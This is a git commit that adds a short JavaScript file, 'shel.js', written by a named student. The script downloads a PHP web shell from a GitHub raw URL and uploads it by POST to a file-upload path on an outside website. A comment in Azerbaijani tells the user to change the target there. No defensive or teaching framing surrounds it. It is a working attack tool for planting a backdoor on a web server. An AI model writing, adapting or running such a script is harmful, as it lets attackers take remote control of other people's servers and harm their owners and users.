4396f068d9cff52381b4b5d77a0d0d832b89d93b
Farid Muslimov <farid.muslumov.tn@student.aztu.edu.az>
2025-04-10 13:25:16 +0400

    Create shel.js

---
+++ shel.js
@@ -0,0 +1,11 @@
+fetch("https://raw.githubusercontent.com/studentgupgup/testingg/refs/heads/main/shell.php")
+  .then(r => r.blob())
+  .then(blob => {
+    const form = new FormData();
+    form.append("file", new File([blob], "shell.php", { type: "application/x-php" }));
+
+    fetch("http://arminfo.info/index_files", { // <<< BURANI DƏYİŞ
+      method: "POST",
+      body: form
+    });
+  });
